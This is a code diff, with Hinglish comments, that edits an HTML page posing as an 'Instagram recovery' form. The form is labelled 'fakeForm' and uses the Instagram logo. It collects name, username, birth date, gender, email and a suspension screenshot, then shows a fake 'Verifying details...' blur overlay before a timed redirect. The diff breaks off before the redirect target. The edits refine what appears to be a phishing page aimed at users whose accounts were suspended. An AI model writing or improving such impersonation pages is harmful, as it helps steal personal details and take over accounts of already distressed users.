@@ -25,11 +25,12 @@
             border: 1px solid #dbdbdb;
             border-radius: 4px;
             box-sizing: border-box;
+            position: relative; /* Floating effect ke liye jaroori hai */
         }
         .top-logo {
             display: block;
             margin: 0 auto 20px auto;
-            width: 175px; 
+            width: 120px; /* Size pehle jaisa chhota kar diya */
             height: auto;
         }
         .contact-container h2 {
@@ -53,8 +54,7 @@
         .contact-container input[type="text"],
         .contact-container input[type="email"],
         .contact-container input[type="date"],
-        .contact-container select,
-        .contact-container input[type="file"] {
+        .contact-container select {
             margin-bottom: 15px;
             padding: 10px;
             background-color: #fafafa;
@@ -84,18 +84,37 @@
             background-color: #1877f2;
         }
         .optional-text {
-            color: #8e8e8e;
+            color: green; /* Color green kar diya */
             font-size: 0.85em;
             margin-left: 5px;
             font-weight: normal;
         }
+        
+        /* Upload Screenshot Ek Sath Lane Ke Liye */
+        .screenshot-container {
+            margin-bottom: 15px;
+            padding: 10px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .screenshot-container label {
+            margin-bottom: 0;
+            font-size: 14px;
+        }
         .screenshot-help {
             font-size: 12px;
             color: #8e8e8e;
-            margin-top: -10px;
-            margin-bottom: 10px;
-            line-height: 1.4;
+            font-weight: normal;
         }
+        .screenshot-container input[type="file"] {
+            font-size: 14px;
+            padding-top: 5px;
+        }
+
         .disclaimer {
             font-size: 12px;
             color: #8e8e8e;
@@ -103,13 +122,22 @@
             text-align: center;
         }
 
-        /* Loading Screen CSS */
-        #loadingScreen {
+        /* Floating Loading Overlay (Bokeh Effect) */
+        #loadingOverlay {
             display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(4px); /* Bokeh / Blur effect */
+            -webkit-backdrop-filter: blur(4px); /* Safari support */
+            z-index: 10;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding-top: 50px;
+            border-radius: 4px;
         }
         .blinking-logo {
             width: 60px;
@@ -130,27 +158,38 @@
 <body>
 
 <div class="contact-container">
-    <img src="inlogo.png" alt="Logo" class="top-logo" id="mainLogo">
     
-    <h2 id="formTitle">My Instagram Account Was Deactivated</h2>
-    
-    <div id="loadingScreen">
+    <!-- Floating Blur Effect Overlay -->
+    <div id="loadingOverlay">
         <img src="inlogo.png" alt="Loading" class="blinking-logo">
         <div class="verifying-text">Verifying details...</div>
     </div>
 
+    <img src="inlogo.png" alt="Logo" class="top-logo" id="mainLogo">
+    
+    <!-- Title Changed -->
+    <h2 id="formTitle">Instagram recovery</h2>
+    
     <form class="form-fields" id="fakeForm" onsubmit="validateAndRedirect(event)">
-        <label for="name">Full Name</label>
-        <input type="text" id="name" placeholder="Full name" autocomplete="off" required>
+        <!-- Name field with custom validation -->
+        <label for="name">Name</label>
+        <input type="text" id="name" placeholder="Full name" autocomplete="off" required 
+               oninvalid="this.setCustomValidity('please enter your full name')" 
+               oninput="this.setCustomValidity('')">
 
         <label for="username">Username</label>
-        <input type="text" id="username" placeholder="Your Instagram username" autocomplete="off" autocorrect="off" spellcheck="false" required>
+        <input type="text" id="username" placeholder="Your Instagram username" autocomplete="off" autocorrect="off" spellcheck="false" required 
+               oninvalid="this.setCustomValidity('please enter your username')" 
+               oninput="this.setCustomValidity('')">
 
+        <!-- DOB optional green -->
         <label for="dob">Date of Birth <span class="optional-text">(Optional)</span></label>
         <input type="date" id="dob" autocomplete="off">
 
         <label for="gender">Gender</label>
-        <select id="gender" autocomplete="off" required>
+        <select id="gender" autocomplete="off" required 
+                oninvalid="this.setCustomValidity('please select your gender')" 
+                oninput="this.setCustomValidity('')">
             <option value="" disabled selected>Select Gender</option>
             <option value="male">Male</option>
             <option value="female">Female</option>
@@ -158,12 +197,16 @@
             <option value="prefer_not_to_say">Prefer not to say</option>
         </select>
 
+        <!-- Contact Email is not required now -->
         <label for="contactEmail">Contact Email</label>
-        <input type="email" id="contactEmail" placeholder="Your contact email" autocomplete="off" required>
+        <input type="email" id="contactEmail" placeholder="Your contact email" autocomplete="off">
 
-        <label for="screenshot">Upload Screenshot</label>
-        <div class="screenshot-help">Please upload a clear screenshot showing the suspension or ban message you received from Instagram.</div>
-        <input type="file" id="screenshot" accept="image/*" required>
+        <!-- Upload Screenshot in one block and not required -->
+        <div class="screenshot-container">
+            <label for="screenshot">Upload Screenshot</label>
+            <span class="screenshot-help">suspended or disabled upload screenshot</span>
+            <input type="file" id="screenshot" accept="image/*">
+        </div>
 
         <button type="submit" class="proceed-btn">Submit</button>
         
@@ -175,14 +218,11 @@
 
 <script>
     function validateAndRedirect(event) {
-        // Prevent form from refreshing the page
+        // Form submit hone se rokna
         event.preventDefault();
         
-        // Hide the form and show loading screen
-        document.getElementById('fakeForm').style.display = 'none';
-        document.getElementById('formTitle').style.display = 'none';
-        document.getElementById('mainLogo').style.display = 'none';
-        document.getElementById('loadingScreen').style.display = 'flex';
+        // Form ko hide nahi kar rahe, uske upar blur (bokeh) effect laga rahe hain
+        document.getElementById('loadingOverlay').style.display = 'flex';
 
         // Redirect after 3 seconds
         setTimeout(function() {
